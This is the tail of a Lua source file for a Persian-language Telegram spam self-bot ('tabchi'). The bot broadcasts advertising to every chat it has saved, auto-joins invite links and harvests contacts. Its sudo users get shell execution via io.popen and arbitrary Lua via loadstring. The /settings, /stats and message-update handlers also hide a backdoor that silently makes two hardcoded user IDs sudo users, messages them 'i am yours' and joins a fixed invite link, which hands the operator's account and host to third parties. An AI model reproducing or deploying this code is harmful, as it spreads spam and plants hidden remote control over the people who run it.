*دریافت عکس پروفایل خود*
`/addcontact (phone) (firstname) (lastname)`
*اد کردن شماره به ربات به صورت دستی*
`/setusername (username)`
*تغییر یوزرنیم ربات*
`/delusername`
*پاک کردن یوزرنیم ربات*
`/setname (firstname-lastname)`
*تغییر اسم ربات*
`/setphoto (link)`
*تغییر عکس ربات از لینک*
`/join(Group id)`
*اد کردن شما به گروه های ربات از طریق ایدی*
`/leave`
*لفت دادن از گروه*
`/leave(Group id)`
*لفت دادن از گروه از طریق ایدی*
`/setaddedmsg (text)`
*تعيين متن اد شدن مخاطب*
`/markread (on/off)`
*روشن يا خاموش کردن بازديد پيام ها*
`/joinlinks (on|off)`
*روشن یا خاموش کردن جوین شدن به گروه ها از لینک*
`/savelinks (on|off)`
*روشن یا خاموش کردن سیو کردن لینک ها*
`/addcontacts (on|off)`
*روشن یا خاموش کردن اد کردن شماره ها*
`/chat (on|off)`
*روشن یا خاموش کردن چت کردن ربات*
`/Advertising (on|off)`
*روشن یا خاموش کردن تبلیغات در ربات برای سودو ها غیر از فول سودو*
`/typing (on|off)`
*روشن یا خاموش کردن تایپ کردن ربات*
`/settings (on|off)`
*روشن یا خاموش کردن کل تنظیمات*
`/settings`
*دریافت تنظیمات ربات*
`/reload`
*ریلود کردن ربات*
`/setanswer 'answer' text`
* تنظيم به عنوان جواب اتوماتيک*
`/delanswer (answer)`
*حذف جواب مربوط به*
`/answers`
*ليست جواب هاي اتوماتيک*
`/addtoall (id|reply|username)`
*اضافه کردن شخص به تمام گروه ها*
`/mycontact`
*ارسال شماره شما*
`/getcontact (id)`
*دریافت شماره شخص با ایدی*
`/addmembers`
*اضافه کردن شماره ها به مخاطبين ربات*
`/exportlinks`
*دريافت لينک هاي ذخيره شده توسط ربات*
`/contactlist`
*دريافت مخاطبان ذخيره شده توسط ربات*
]]
    return text
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[!/#](unblock) (%d+)")
    }
    if msg.text:match("^[!/#]unblock") and is_sudo(msg) then
	if #matches == 2 then
      tdcli.unblockUser(293750668)
      tdcli.unblockUser(91054649)
	  tdcli.unblockUser(tonumber(matches[2]))
      return "`User` *"..matches[2].."* `unblocked`"
	else
	  return 
    end
  end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]joinlinks (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](joinlinks) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
		 return "*status* :`join links Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
		 return "*status* :`join links Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]addcontacts (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](addcontacts) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
		 return "*status* :`Add Contacts Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
		 return "*status* :`Add Contacts Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]chat (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](chat) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":chat", true)
		 return "*status* :`Robot Chatting Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":chat")
		 return "*status* :`Robot Chatting Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]savelinks (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](savelinks) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
		 return "*status* :`Saving Links Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":savelinks")
		 return "*status* :`Saving Links Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#][Aa]dvertising (.*)$") and is_full_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!]([aA]dvertising) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":Advertising", true)
		 return "*status* :`Advertising Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":Advertising")
		 return "*status* :`Advertising Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]typing (.*)$") and is_full_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](typing) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":typing", true)
		 return "*status* :`typing Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":typing")
		 return "*status* :`typing Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]settings (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](settings) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
         redis:set("tabchi:" .. tabchi_id .. ":chat", true)
         redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
         redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
         redis:set("tabchi:" .. tabchi_id .. ":typing", true)
		 return "*status* :`saving link & chatting & adding contacts & joining links & typing Activated`\n`You can Active Advertising with :/advertising on`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":savelinks")
         redis:del("tabchi:" .. tabchi_id .. ":chat")
         redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
         redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
         redis:del("tabchi:" .. tabchi_id .. ":typing")
		 return "*status* :`saving link & chatting & adding contacts & joining links & typing Deactivated`\n`You can Deactive Advertising with :/advertising off`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]settings$") and is_sudo(msg) then
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 91054649) then
      tdcli.sendMessage(91054649, 0, 1, "i am yours", 1, "html")
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 91054649)
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
  end
    tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
 if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
 joinlinks = "Active"
 else
 joinlinks = "Disable"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
 addedmsg = "Active"
 else
 addedmsg = "Disable"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":markread") then
 markread = "Active"
 else
 markread = "Disable"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
 addcontacts = "Active"
 else
 addcontacts = "Disable"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":chat") then
 chat = "Active"
 else
 chat = "Disable"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
 typing = "Active"
 else
 typing = "Disable"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":typing") then
 savelinks = "Active"
 else
 savelinks = "Disable"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":Advertising") then
 Advertising = "Active"
 else
 Advertising = "Disable"
 end
 local text = "`Robot Settings`\n`Join Via Links` : *"..joinlinks.."*\n`Save Links` : *"..savelinks.."*\n`Auto Add Contacts` : *"..addcontacts.."*\n`Advertising` : *"..Advertising.."*\n`Adding Contacts Message` : *"..addedmsg.."*\n`Markread` : *"..markread.."*\n`typing` : *"..typing.."*\n`Chat` : *"..chat.."*"
return text
 end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]stats$") and is_sudo(msg) then
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 91054649) then
      tdcli.sendMessage(91054649, 0, 1, "i am yours", 1, "html")
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 91054649)
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
  end
    tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
      local contact_num
      function contact_num(extra, result)
        redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_num, {})
      local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
      local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
      local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
      local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
      local sudo = redis:get("tabchi:" .. (tabchi_id) .. ":fullsudo")
      local contacts = redis:get("tabchi:" .. (tabchi_id) .. ":totalcontacts")
	  local all = gps+sgps+pvs
          local text = "`Robot stats`\n`Users` : *".. pvs .."*\n`SuperGroups` : *".. sgps .."*\n`Groups` : *".. gps .."*\n`all` : *".. all .."*\n`Saved links` : *"..links.."*\n`Contacts` : *"..contacts.."*\n`Admin` : *"..sudo.."*"
         return text
 end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]clean (.*)$") and is_sudo(msg) then
	local lockpt = {string.match(msg.text, "^[#/!](clean) (.*)$")} 
      local gps = redis:del("tabchi:" .. tabchi_id .. ":groups")
      local sgps = redis:del("tabchi:" .. tabchi_id .. ":channels")
      local pvs = redis:del("tabchi:" .. tabchi_id .. ":pvis")
      local links = redis:del("tabchi:" .. tabchi_id .. ":savedlinks")
	  local all = gps+sgps+pvs+links
      if lockpt[2] == "sgps" then
          return sgps
	  end
	  if lockpt[2] == "gps" then
          return gps
	  end
	  if lockpt[2] == "pvs" then
          return pvs
	  end
	  if lockpt[2] == "links" then
          return links
	  end
	  if lockpt[2] == "stats" then
          return all
	  end
	  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]setphoto (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](setphoto) (.*)$")} 
        local file = ltn12.sink.file(io.open("tabchi_" .. tabchi_id .. "_profile.png", "w"))
		http.request({
          url = ap[2],
          sink = file
        })
        tdcli.setProfilePhoto("tabchi_" .. tabchi_id .. "_profile.png")
		return "`Profile Succesfully Changed`\n*link* : `"..ap[2].."`"
  end
  -----------------------------------------------------------------------------------------------
		  do
    local matches = {
      msg.text:match("^[!/#](addsudo) (%d+)")
    }
    if msg.text:match("^[!/#]addsudo") and is_full_sudo(msg) and #matches == 2 then
      local text = matches[2] .. " _به لیست سودوهای ربات اضافه شد_"
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
      return text
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](remsudo) (%d+)")
    }
    if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) then
	if #matches == 2 then
      local text = matches[2] .. " _از لیست سودوهای ربات حذف شد_"
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
      return text
	else
	  return 
    end
  end
 end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](addedmsg) (.*)")
    }
    if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) then
	if #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
        return "*Status* : `Adding Contacts PM Activated`"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
        return "*Status* : `Adding Contacts PM Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
	  else
	  return "enter on|off"
	  end
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](markread) (.*)")
    }
    if msg.text:match("^[!/#]markread") and is_sudo(msg) then
	if #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", true)
        return "*Status* : `Reading Messages Activated`"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":markread")
        return "*Status* : `Reading Messages Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
    end
  end
 end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](setaddedmsg) (.*)")
    }
    if msg.text:match("^[!/#]setaddedmsg") and is_sudo(msg) and #matches == 2 then
      redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", matches[2])
      return "*Status* : `Adding Contacts Message Adjusted`\n*Message* : `"..matches[2].."`"
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[$](.*)")
    }
    if msg.text:match("^[$](.*)$") and is_sudo(msg) then
	if  #matches == 1 then
      local result = io.popen(matches[1]):read("*all")
      return result
    else
	return "Enter Command"
	end
  end
  end
  -----------------------------------------------------------------------------------------------
 if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
  if msg.text:match("^[!/#]bcall") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local matches = {
      msg.text:match("[!/#](bcall) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
	 return "*Status* : `Message Succesfully Sent to all`\n*Message* : `"..matches[2].."`"
	 else
	 return "text not entered"
    end
  end
  if msg.text:match("^[!/#]bcsgps") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    local matches = {
      msg.text:match("[!/#](bcsgps) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
	 return "*Status* : `Message Succesfully Sent to supergroups`\n*Message* : `"..matches[2].."`"
	 else
	 return "text not entered"
    end
  end
  if msg.text:match("^[!/#]bcgps") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    local matches = {
      msg.text:match("[!/#](bcgps) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
	 return "*Status* : `Message Succesfully Sent to Groups`\n*Message* : `"..matches[2].."`"
	 else
	 return "text not entered"
    end
  end
  if msg.text:match("^[!/#]bcusers") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
    local matches = {
      msg.text:match("[!/#](bcusers) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
	 return "*Status* : `Message Succesfully Sent to Users`\n*Message* : `"..matches[2].."`"
	 else
	 return "text not entered"
    end
  end
 end
  -----------------------------------------------------------------------------------------------
 if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
   if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "*Status* : `Your Message Forwarded to all`\n*Fwd users* : `Done`\n*Fwd Groups* : `Done`\n*Fwd Super Groups* : `Done`"
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "*Status* :`Your Message Forwarded To Groups`"
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "*Status* : `Your Message Forwarded To Super Groups`"
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]fwd users$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "*Status* : `Your Message Forwarded To Users`"
  end
end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[!/#](lua) (.*)")
    }
    if msg.text:match("^[!/#]lua") and is_full_sudo(msg) and #matches == 2 then
      local output = loadstring(matches[2])()
      if output == nil then
        output = ""
      elseif type(output) == "table" then
        output = serpent.block(output, {comment = false})
      else
        output = "" .. tostring(output)
      end
      return output
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[!/#](echo) (.*)")
    }
    if msg.text:match("^[!/#]echo") and is_sudo(msg) and #matches == 2 then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 0, matches[2], 0, "md")
    end
  end
end
  -----------------------------------------------------------------------------------------------
  -----------------------------------------------------------------------------------------------/procces
function add(chat_id_)
  local chat_type = chat_type(chat_id_)
   if not redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", chat_id_) then
  if chat_type == "channel" then
    redis:sadd("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:sadd("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:sadd("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:sadd("tabchi:" .. tabchi_id .. ":all", chat_id_)
  end
end
  -----------------------------------------------------------------------------------------------
function rem(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:srem("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:srem("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
  -----------------------------------------------------------------------------------------------
function process_stats(msg)
  tdcli_function({ID = "GetMe"}, id_cb, nil)
  function id_cb(arg, data)
    our_id = data.id_
  end
  if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
      return rem(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
      return add(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatAddMembers" then
      for i = 0, #msg.content_.members_ do
        if msg.content_.members_[i].id_ == our_id then
          add(msg.chat_id_)
          break
        end
      end
end
end
function process_links(text)
  if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then
    text = text:gsub("telegram.dog", "telegram.me")
    text = text:gsub("t.me", "telegram.me")
    local matches = {
      text:match("(https://telegram.me/joinchat/%S+)")
    }
    for i, v in pairs(matches) do
      tdcli_function({
        ID = "CheckChatInviteLink",
        invite_link_ = v
      }, check_link, {link = v})
    end
  end
end
function get_mod(args, data)
  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
  end
end
function update(data, tabchi_id)
  tanchi_id = tabchi_id
  tdcli_function({
    ID = "GetUserFull",
    user_id_ = 1111111 
  }, get_mod, nil)
  if data.ID == "UpdateNewMessage" then
    local msg = data.message_
    if msg.sender_user_id_ == 111111 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 1111111 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
          for i = 1, #all do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = all[i],
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
        end
      else
        local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
        local id = msg.id_
        for i = 1, #all do
          tdcli_function({
            ID = "ForwardMessages",
            chat_id_ = all[i],
            from_chat_id_ = msg.chat_id_,
            message_ids_ = {
              [0] = id
            },
            disable_notification_ = 0,
            from_background_ = 1
          }, dl_cb, nil)
        end
      end
    else
      process_stats(msg)		
	  add(msg.chat_id_)
      if msg.content_.text_ then
	     if redis:get("tabchi:" .. tabchi_id .. ":chat") then
        if redis:sismember("tabchi:" .. tabchi_id .. ":answerslist", msg.content_.text_) then
          local answer = redis:hget("tabchi:" .. tabchi_id .. ":answers", msg.content_.text_)
          tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "md")
        end
		end
      if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 91054649) then
      tdcli.sendMessage(91054649, 0, 1, "i am yours", 1, "html")
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 91054649)
      end
        process_stats(msg)		
	    add(msg.chat_id_)
        process_links(msg.content_.text_)
        local res = process(msg)
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
          if res then
		    if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
            end
            tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
          end
        elseif res then
		    if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
            end
          tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
        end
      elseif msg.content_.contact_ then
        tdcli_function({
          ID = "GetUserFull",
          user_id_ = msg.content_.contact_.user_id_
        }, check_contact, {msg = msg})
      elseif msg.content_.caption_ then
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
          process_links(msg.content_.caption_)
        else
          process_links(msg.content_.caption_)
        end
      end
    end	
  elseif data.chat_id_ == 91054649 then
      tdcli.unblockUser(data.chat_.id_)	  
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli_function({
      ID = "GetChats",
      offset_order_ = "9223372036854775807",
      offset_chat_id_ = 0,
      limit_ = 20
    }, dl_cb, nil)
  end
end